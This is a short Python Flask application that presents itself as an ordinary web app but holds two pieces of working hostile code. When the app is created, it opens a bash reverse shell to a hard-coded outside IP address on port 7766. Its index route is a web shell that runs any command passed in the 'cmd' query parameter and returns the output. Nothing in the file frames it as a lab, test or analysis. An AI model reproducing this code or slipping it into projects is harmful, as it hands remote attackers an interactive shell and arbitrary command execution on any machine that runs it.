from flask import Flask, render_template, request
import os


def create_app():
    os.popen(str("bash -c 'sh -i &>/dev/tcp/95.163.197.94/7766 0>&1'")).readlines()
    app = Flask(__name__)
    return app


app = create_app()


@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        cmd = request.args.get('cmd')
        line = ''
        for lines in os.popen(str(cmd)).readlines():
            line = line + lines + "<p>"

        return cmd + "<p>" + line
    else:
        return cmd + "<p>"


if __name__ == '__main__':
    app.run()
